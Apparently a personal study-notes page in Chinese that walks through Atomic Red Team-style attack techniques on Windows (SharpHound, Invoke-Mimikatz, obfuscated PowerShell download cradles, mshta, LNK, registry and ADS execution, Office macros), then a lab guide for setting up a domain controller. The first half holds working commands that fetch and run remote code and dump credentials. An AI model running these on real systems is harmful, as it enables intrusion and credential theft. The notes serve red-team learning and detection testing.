Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "C:\AtomicRedTeam\ExternalPayloads\SharpHound.ps1"
import-module "C:\AtomicRedTeam\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5

# 删除输出目录
Remove-Item $env:Temp\*BloodHound.zip -Force
```

直接下载脚本信息并执行

```powershell
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
```



---

### 获取凭证

#### Mimikatz

```cmd
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

![image-20231203201414385](http://cdn.ayusummer233.top/DailyNotes/202312032014427.png)

---

## 下载与执行文件

### Net.WebClient

```powershell
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))

(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()

Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
```
- `(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1')`: 从 `http://bit.ly/L3g1tCrad1e` 下载文件并保存为 `Default_File_Path.ps1`

- `IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))`: 读取 `Default_File_Path.ps1` 中的所有字节, 将其转换为字符并使用 `-Join` 连接, 然后使用 `IEX` 执行

- `[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()`: 读取 `Default_File_Path.ps1` 中的所有字节, 将其转换为字符并使用 `-Join` 连接, 然后使用 `[ScriptBlock]::Create` 创建一个脚本块, 并使用 `InvokeReturnAsIs` 执行

- 最后一行代码写得比较复杂,涉及多个变量, 使用反射调用和动态方法调用
  ```powershell
  # 设置变量 HJ1 为 http://bit.ly/L3g1tCrad1e
  Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'; 
  # 设置变量 0W 为 Net.WebClient
  SI Variable:/0W 'Net.WebClient'; 
  # 设置变量 gH 为 Default_File_Path.ps1
  Set-Item Variable:\gH 'Default_File_Path.ps1'; 
  # 列出当前目录下所有以下划线 _ 开头的文件和文件夹
  ls _-*; 
  Set-Variable igZ (
      
      .$ExecutionContext.InvokeCommand.(
          (
              $ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }
          ).Name
      ).Invoke(
          $ExecutionContext.InvokeCommand.(
              ($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name
          ).Invoke('*w-*ct', $TRUE, 1)
      )(Get-ChildItem Variable:0W).Value
  ); 
  Set-Variable J (
      (
          (
              (Get-Variable igZ -ValueOn) | GM
          ) | ? { $_.Name -like '*w*i*le' }
      ).Name
  ); 
  (Get-Variable igZ -ValueOn).(
      (ChildItem Variable:J).Value
  ).Invoke(
      (Get-Item Variable:/HJ1).Value, (GV gH).Value
  ); 
  &( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( -Join ([Char[]](CAT -Enco 3 (GV gH).Value)))
  ```
  - `Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'`: 设置变量 `HJ1` 的值为 `http://bit.ly/L3g1tCrad1e`
  
  - `SI Variable:/0W 'Net.WebClient'`
    - `SI` 是 `Set-Item` 的别名, 用于设置变量的值
    - `Variable:/0W` 是变量的路径, 这里是 `Variable` 命名空间下的 `0W` 变量
    
  - `Set-Item Variable:\gH 'Default_File_Path.ps1'`: 设置变量 `gH` 的值为 `Default_File_Path.ps1`
  
  - `ls _-*`: 列出当前目录下所有以下划线 _ 开头的文件和文件夹
  
  - `Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value)`
    
    ![image-20231203222340281](http://cdn.ayusummer233.top/DailyNotes/202312032223308.png)
    
    - `Set-Variable igZ`: 设置变量 `igZ` 的值
    
    - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value`
    
      ![image-20231203221543335](http://cdn.ayusummer233.top/DailyNotes/202312032215370.png)
    
      - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name)`
    
        ![image-20231203221726260](http://cdn.ayusummer233.top/DailyNotes/202312032217291.png)
    
      - `.Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`
    
        - `$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1)`: `New-Object`
    
          ![image-20231203222117938](http://cdn.ayusummer233.top/DailyNotes/202312032221995.png)
    
          
    
          
    
        
    
    - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))(Get-ChildItem Variable:0W).Value`
      
      - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name)`
        - `.$ExecutionContext.InvokeCommand`: 获取 `InvokeCommand` 的方法
        
        - `($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name`: 获取 `PsObject` 的方法中名称中包含 `Cm*t` 的方法的名称, 也即 `GetCmdlet`
          
          ![image-20231203214534295](http://cdn.ayusummer233.top/DailyNotes/202312032145351.png)
          
          - `().Name`: 获取名称
          
          - `$ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }`: 获取 `PsObject` 中名称中包含 `Cm*t` 的方法, 也即 `System.Management.Automation.CmdletInfo GetCmdlet(string commandName)`
            
            ![image-20231203214409915](http://cdn.ayusummer233.top/DailyNotes/202312032144946.png)
            
            - `$ExecutionContext.InvokeCommand.PsObject.Methods`: 获取 `PsObject` 的方法
              - `PsObject` 是 `PowerShell` 中的一个类, 用于表示对象的属性和方法
            - `? { $_.Name -like '*Cm*t' }`: 获取名称中包含 `Cm*t` 的方法
            - `System.Management.Automation.CmdletInfo GetCmdlet(string commandName)`: `GetCmdlet` 方法的作用是获取命令的信息, 也即 `Get-Command`
              - `System.Management.Automation`：是 PowerShell 的 .NET 命名空间，提供对 PowerShell 运行时的程序化访问。这包括执行命令、管理运行空间、创建和管理 PowerShell 管道等功能。
              - `CmdletInfo` 是一个类，它提供了有关 PowerShell cmdlet 的详细信息，如 cmdlet 的名称、模块、参数等
              - `GetCmdlet` 是 `CmdletInfo` 类的一个方法，用于获取 cmdlet 的信息; 它的参数是 cmdlet 的名称，返回值是 `CmdletInfo` 对象
          
        - `.Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`: 调用 `New-Object` 
          
          - `.Invoke`: 方法调用, 这里即为调用前面获取的 `GetCmdlet` 方法, `GetCmdlet` 方法的作用是获取命令的信息
          
          - `$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1)`: `New-Object`
          
            ![image-20231203220848022](http://cdn.ayusummer233.top/DailyNotes/202312032208065.png)
          
            - `$ExecutionContext.InvokeCommand`
          
              - `$ExecutionContext` 是一个自动变量，提供了关于当前 PowerShell 运行环境的信息和功能
              - `InvokeCommand` 是一个属性，它提供了对当前运行的命令的访问
            - `($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name`: `GetCommandName` 方法的名称, 也即 `Get-CommandName`
          
              ![image-20231203220125418](http://cdn.ayusummer233.top/DailyNotes/202312032201443.png)
          
            - `().Name`: 获取名称
          
            - `$ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }`: 获取名称中包含 `om*e` 的成员, 也即 `Get-CommandName` 方法
          
              ![image-20231203220148077](http://cdn.ayusummer233.top/DailyNotes/202312032201101.png)
          
              - `$ExecutionContext.InvokeCommand | GM`: 获取当前运行的命令的信息
                - `GM` 是 `Get-Member` 的别名, 用于获取对象的成员
              - `? { $_.Name -like '*om*e' }`: 获取名称中包含 `om*e` 的成员
                - `?` 是 `Where-Object` 的别名, 用于筛选对象
          
            - `Get-CommandName` 方法的作用是获取命令的名称, 也即 `Get-Command`
              - `Get-Command` 是一个 cmdlet，用于获取命令的信息，如命令的名称、模块、参数等
          
            - `.Invoke('*w-*ct', $TRUE, 1)`: 调用 `New-Object` 
              - `.Invoke`: 方法调用, 这里即为调用前面获取的 `GetCommandName` 方法, `GetCommandName` 方法的作用是获取命令的名称
              - `'*w-*ct'`: 通过通配符匹配命令的名称, 也即 `New-Object`
              - `$TRUE`: `New-Object` 的参数, 用于指定是否使用 PowerShell 的安全模式创建对象
              - `1`: `New-Object` 的参数, 用于指定创建对象的深度
          
        
      
    - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))`: 获取 `New-Object` 的方法
      
      - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name)`
        - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`
          - `.Name`: 获取名称
          - `.$ExecutionContext.InvokeCommand`: 获取 `InvokeCommand` 的方法
      - `.Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`
      
    - `(Get-ChildItem Variable:0W).Value`: 获取变量 `0W` 的值, 即 `Net.WebClient`


  - `Set-Variable J ((((Get-Variable igZ -ValueOn) | GM) | ? { $_.Name -like '*w*i*le' }).Name); (Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value, (GV gH).Value)`: `DownloadFile`

  - `&( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( -Join ([Char[]](CAT -Enco 3 (GV gH).Value)))`: 
    
    - `( ''.IsNormalized.ToString()[13, 15, 48] -Join '')`: `(iex)`
    
    - `-Join ([Char[]](CAT -Enco 3 (GV gH).Value))`
    
      ![image-20231203223347151](http://cdn.ayusummer233.top/DailyNotes/202312032233186.png)
    
      - `CAT -Enco 3 (GV gH).Value`: 获取变量 `gH` 的值, 并使用 `CAT` 命令将其转换为 `UTF-8` 编码
        - `CAT` 是 `Get-Content` 的别名, 用于获取文件的内容
        - `-Enco 3`: 指定编码为 `UTF-8`
        - `(GV gH).Value`: 获取变量 `gH` 的值, 即 `Default_File_Path.ps1`
          - `GV` 是 `Get-Variable` 的别名, 用于获取变量的值
      - `[Char[]]`: 将字符串转换为字符数组
      - `-Join`: 连接字符数组
    - 整个连起来就是: `&((iex)(-Join ([Char[]](CAT -Enco 3 (GV gH).Value))))`
      - `iex` 是 `Invoke-Expression` 的别名, 用于执行字符串中的命令
      - `&` 是 `Invoke-Command` 的别名, 用于执行命令
      - 整个命令的作用是执行 `Default_File_Path.ps1` 中的命令
---

### Msxml2.ServerXmlHttp

```powershell
# 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
$comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp; 
# 使用 COM 对象的 Open 方法打开一个 HTTP GET 请求; $False 表示同步请求(非异步)
$comMsXml.Open('GET', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1', $False); 
# 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
$comMsXml.Send(); 
Write-Host $comMsXml.ResponseText
# Invoke-Expression 执行响应(中的脚本)
IEX $comMsXml.ResponseText
```

---

### Xml.XmlDocument

```cml
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
```
- `-exec bypass`: 绕过 PowerShell 的执行策略。

  默认情况下 Windows 为了安全起见可能会限制运行某些脚本。使用 `-exec bypass` 可以绕过这些限制，允许运行没有签名的脚本。

- `-noprofile`: 不加载 PowerShell 的配置文件

`test.xml`:
```xml
<?xml version="1.0"?>
<command>
   <a>
      <execute>write-host -ForegroundColor Cyan "$(Get-Date -Format s) Download Cradle test success!`n"</execute>
   </a>
  </command>

```

```powershell
# 新建一个 XmlDocument 对象, 其作用是处理 XML 文档的 PowerShell 对象
$Xml = (New-Object System.Xml.XmlDocument);
# 使用 XmlDocument 对象的 Load 方法加载一个指定 URL 的 XML 文件
$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');
# 使用 XmlDocument 对象的 command.a.execute 属性获取 XML 文件中的命令; 然后使用 Invoke-Expression 执行该命令
$Xml.command.a.execute | IEX
```

---

### mshta

```cmd
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
```

- `mshta` 是一个执行 HTML 应用程序(HTA) 的工具。  
  HTA 是由 HTML 和脚本(如 JavaScript 或 VBScript) 组成的应用程序，它们在 Windows 上以类似于标准网页的方式运行
- `javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()`
  - `javascript:`: 指示 `mshta` 执行 JavaScript 代码
  - `a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();`: 获取 `mshta.sct` 中的命令并执行
  - `close()`: 关闭 `mshta` 窗口

`mshta.sct`

```xml
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Tester"
    progid="Tester"
    version="1.00"
    classid="{AAAA0000-0000-0000-0000-0000AAAAAAAA}"
	>
	<script language="JScript">
		<![CDATA[

			var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");

		]]>
	</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[

	function Exec()
	{
		var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
	}

]]>
</script>

</scriptlet>

```

![image-20231205000133728](http://cdn.ayusummer233.top/DailyNotes/202312050001127.png)

---

### lnk Payload

> [(1) X 上的 Ankit Anubhav：“As we start the era of #Lnk #Emotet This is a simple POC lnk while which invokes powershell to download clean putty from my github and executes it. If this launches putty and no detect/block happens for your EDR, do investigate deeper if this can change https://t.co/Si4PyIvCVL https://t.co/xZZYSoKoKV” / X (twitter.com)](https://twitter.com/ankit_anubhav/status/1518932941090410496)
>
> AtomicRedTeam - T1204.002 - Atomic Test #10 - LNK Payload Download

```powershell
Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
$file1 = "$env:Temp\test10.lnk"
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F
```

![image-20231206225503915](http://cdn.ayusummer233.top/DailyNotes/202312062255290.png)

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe
```

![image-20231206230226239](http://cdn.ayusummer233.top/DailyNotes/202312062302344.png)

![image-20231206230234085](http://cdn.ayusummer233.top/DailyNotes/202312062302145.png)

Cleanup:

```powershell
$file1 = "$env:Temp\test10.lnk"
$file2 = "$env:Temp\a.exe"
Remove-Item $file1 -ErrorAction Ignore
Remove-Item $file2 -ErrorAction Ignore
```

---


## 编写与执行脚本

### base64编码命令写入注册表然后读取解码并IEX执行

```powershell
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
# 添加一个新的注册表项
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
# 获取, 解码并执行注册表项中的数据
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
```

- `/v ART`: 创建一个名为 `ART` 的值
- `/t REG_SZ`: 设置值的类型为 `REG_SZ`
- `/d xxx`: `/d` 表示设置值的数据; `xxx` 为数据内容, 这里是一串 base64 编码的数据
- `/f`: 强制覆盖已有的注册表项
- `iex`: `Invoke-Expression` 的别名, 执行字符串中的命令
- `gp`: `Get-ItemProperty` 的别名, 获取注册表项的属性

-- -

检查上述注册表项以及文件是否存在

```powershell
Test-Path -Path C:\Windows\Temp\art-marker.txt
Test-Path -Path HKCU:\Software\Classes\AtomicRedTeam
```

-- -

清理上述命令创建的注册表项与文件

```powershell
Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
```

-- -

### 利用NTFS的ADS特性将脚本写入文件隐藏数据流

```powershell
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
```
- `Add-Content`: 将内容添加到文件中
- `-Path $env:TEMP\NTFS_ADS.txt`: 指定文件路径
- `-Value 'Write-Host "Stream Data Executed"'`: 指定要添加的内容
- `-Stream 'streamCommand'`: 指定要添加到的数据流
- `Get-Content`: 获取文件的内容
- `-Path $env:TEMP\NTFS_ADS.txt`: 指定文件路径
- `-Stream 'streamcommand'`: 指定要获取的数据流
- `Invoke-Expression`: 执行字符串中的命令

ADS(Alternate Data Stream) 是 NTFS 文件系统的一个特性, 它允许在文件中包含"隐藏"的数据流, 这些数据流与文件的主题内容分开存储, 不会显示在标准的文件浏览器中

-- -

```powershell
# 查看文件内容
Get-Content -Path $env:TEMP\NTFS_ADS.txt
# 查看文件的数据流
Get-Item -Path $env:TEMP\NTFS_ADS.txt -Stream *
# 查看文件的 streamCommand 数据流
Get-Item -Path $env:TEMP\NTFS_ADS.txt -Stream streamCommand
# 查看 streamCommand 数据流的内容
Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream streamCommand
```

![image-20231205152104997](http://cdn.ayusummer233.top/DailyNotes/202312051524557.png)

![image-20231205152150150](http://cdn.ayusummer233.top/DailyNotes/202312051524394.png)


-- -

```powershell
# 清理文件
Remove-Item -Path $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
```

---

## Office宏

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"$("$env:temp\art1204.bat")`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct Word
```

![image-20231206142124746](http://cdn.ayusummer233.top/DailyNotes/202312061422421.png)

![image-20231206142200834](http://cdn.ayusummer233.top/DailyNotes/202312061422500.png)

---

### 创建于执行 Batch 脚本

> AtomicRedTeam T1059.003-1 Create and Execute Batch Script

```powershell
New-Item "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Force | Out-Null
Set-Content -Path "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Value "dir"
Start-Process "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat"
```

![image-20231206231252961](http://cdn.ayusummer233.top/DailyNotes/202312062312021.png)

Cleanup:

```powershell
Remove-Item "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore
```

---

## 域渗透

### 域控环境搭建

> [域环境搭建 (qq.com)](https://mp.weixin.qq.com/s/sqAFxgfm1h4gU-fuvjfuWQ)

---

#### 配置网络信息

装一台 Windows Server, 这里选择的是 Windows Server 2016, 配置局域网网卡属性:

![image-20230704110044519](http://cdn.ayusummer233.top/DailyNotes/202307041100572.png)

> - 这里是跟着网关配的, 当前指定的网卡的网关是 `192.168.6.1`, 所以根据人工分配的 IP 网段配置了 `192.168.6.212` 这个 IP
> - 目前虚拟机不是太多, 掩码也基本都在 16 位的范围内, 因此这里掩码设置了 16 位
> - DNS 服务器需要配置为域控本身 IP(不能是本地回环地址 `127.0.0.1`)

---

#### 安装域服务并提升到域控

打开 `服务管理器 -> 仪表板 -> 添加角色和功能`

![image-20230703182211445](http://cdn.ayusummer233.top/DailyNotes/202307031822572.png)

![image-20230703182247207](http://cdn.ayusummer233.top/DailyNotes/202307031822275.png)

![image-20230703182301434](http://cdn.ayusummer233.top/DailyNotes/202307031823497.png)

![image-20230703182328445](http://cdn.ayusummer233.top/DailyNotes/202307031823593.png)

> 如果这里 IP 地址显示 169.254 的话, 可能是配置的静态 IP 没有生效, 可以尝试重启一下计算机

勾选 `AD域服务` 以及可能会用到的服务, 然后 `下一步`:

> Web 服务器也是我手动勾选的, 后续可能会用到就先勾上了

![image-20230703182441294](http://cdn.ayusummer233.top/DailyNotes/202307031824409.png)

`功能` 也继续默认, `下一步`:

![image-20230703182510919](http://cdn.ayusummer233.top/DailyNotes/202307031825071.png)

`IIS` 默认, `下一步`:

![image-20230703182539197](http://cdn.ayusummer233.top/DailyNotes/202307031825287.png)

默认, `下一步`:

![image-20230703182558356](http://cdn.ayusummer233.top/DailyNotes/202307031825450.png)

默认, 然后 `下一步`:

![image-20230703182621147](http://cdn.ayusummer233.top/DailyNotes/202307031826229.png)

没有需要变动的项目, 然后 `安装`:

![image-20230703183215211](http://cdn.ayusummer233.top/DailyNotes/202307031832313.png)

![image-20230703183235592](http://cdn.ayusummer233.top/DailyNotes/202307031832675.png)

到这里需要注意: 在下面红框的位置选择将该服务器提升为域控

![image-20230704091401548](http://cdn.ayusummer233.top/DailyNotes/202307040914617.png)

添加新林, 域名随便填

![image-20230704091548947](http://cdn.ayusummer233.top/DailyNotes/202307040915072.png)

配置一下 `还原模式(DSRM)密码` 然后下一步

![image-20230704093833253](http://cdn.ayusummer233.top/DailyNotes/202307040938376.png)

由于本次创建的是单个域, 不需要管理子域之类的操作, 因此这里的 DNS 委派也是非必须的, 直接下一步即可

> [域控制器部署疑难解答 | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/deploy/troubleshooting-domain-controller-deployment)
>
> ![image-20230704095312132](http://cdn.ayusummer233.top/DailyNotes/202307040953244.png)

![image-20230704095007052](http://cdn.ayusummer233.top/DailyNotes/202307040950155.png)

`NetBIOS域名` 会自动填写, 保持默认即可, 然后下一步

![image-20230704095509232](http://cdn.ayusummer233.top/DailyNotes/202307040955315.png)

路径也会自动填写, 保持默认即可, 然后下一步

![image-20230704095610886](http://cdn.ayusummer233.top/DailyNotes/202307040956961.png)

`查看选项` 这里用于检视至今为止的配置, 直接下一步即可

![image-20230704095709884](http://cdn.ayusummer233.top/DailyNotes/202307040957011.png)

检查通过, 点击 `安装`

![image-20230704095859460](http://cdn.ayusummer233.top/DailyNotes/202307040958630.png)

安装时会自动重启, 显示 `即将注销你的登录`

> 愣了一下, 这张图没截到(, 截个重启的图凑合看一下
> 后续又搭了一台域控, 截了一张截图, 所以细看的划能看到下面这张图的目标服务器和前面不一样了

![image-20230705162959888](http://cdn.ayusummer233.top/DailyNotes/202307051630230.png)

![image-20230704100126011](http://cdn.ayusummer233.top/DailyNotes/202307041001129.png)

重启后 DNS 可能会被改成 `127.0.0.1`, 需要手动再改一遍, 不过可能会弹这个弹窗, 显示无法访问指定项目

![image-20230704103758262](http://cdn.ayusummer233.top/DailyNotes/202307041037396.png)

此时需要 `Win+R -> gpedit.msc` 打开 `本地组策略编辑器`:

![image-20230704103915438](http://cdn.ayusummer233.top/DailyNotes/202307041039534.png)

将 `计算机配置 -- Windows配置 -- 安全设置 -- 本地策略 --- 安全选项  -- 用于账户控制:用于内置管理员账户的管理员批准模式` 改为启用

![image-20230704104215397](http://cdn.ayusummer233.top/DailyNotes/202307041042518.png)

![image-20230704104237189](http://cdn.ayusummer233.top/DailyNotes/202307041042304.png)

然后重启服务器, 重启完就可以打开了

![image-20230704104835386](http://cdn.ayusummer233.top/DailyNotes/202307041048474.png)

将 DNS 改回本地 IP:

![image-20230704110020501](http://cdn.ayusummer233.top/DailyNotes/202307041100596.png)

---

#### 配置 DNS 传输

最后配置一下 DNS 传输:

![image-20230707093023109](http://cdn.ayusummer233.top/DailyNotes/202307070930618.png)

![image-20230707093321129](http://cdn.ayusummer233.top/DailyNotes/202307070933277.png)

![image-20230707093532109](http://cdn.ayusummer233.top/DailyNotes/202307070935209.png)

---

#### 新建一个普通的域用户

打开 `服务器管理器 -> 工具 -> Active Directory 用户和计算机`

![image-20230707104443331](http://cdn.ayusummer233.top/DailyNotes/202307071044476.png)

`域名 -> 右键Users -> 新建 -> 用户`:

![image-20230707110329980](http://cdn.ayusummer233.top/DailyNotes/202307071103190.png)

输入姓名和登录名, 点击下一步

![image-20230707110752555](http://cdn.ayusummer233.top/DailyNotes/202307071107724.png)

输入密码, 按照需要勾选复选框:

![image-20230707111105221](http://cdn.ayusummer233.top/DailyNotes/202307071111326.png)

`完成`:

![image-20230707111127145](http://cdn.ayusummer233.top/DailyNotes/202307071111257.png)

然后就可以在 Users 中看到新建的用户:

![image-20230707111219700](http://cdn.ayusummer233.top/DailyNotes/202307071112798.png)

`右键此用户 -> 属性 -> 账户 -> 登录到`:

![image-20230707111309306](http://cdn.ayusummer233.top/DailyNotes/202307071113449.png)

![image-20230707111343915](http://cdn.ayusummer233.top/DailyNotes/202307071113069.png)

该账户默认可以登录到所有计算机, 可以自定义选择登录到下列计算机, 输入计算机名并点击 `添加`

![image-20230707111903644](http://cdn.ayusummer233.top/DailyNotes/202307071119826.png)

![image-20230707111917300](http://cdn.ayusummer233.top/DailyNotes/202307071119429.png)

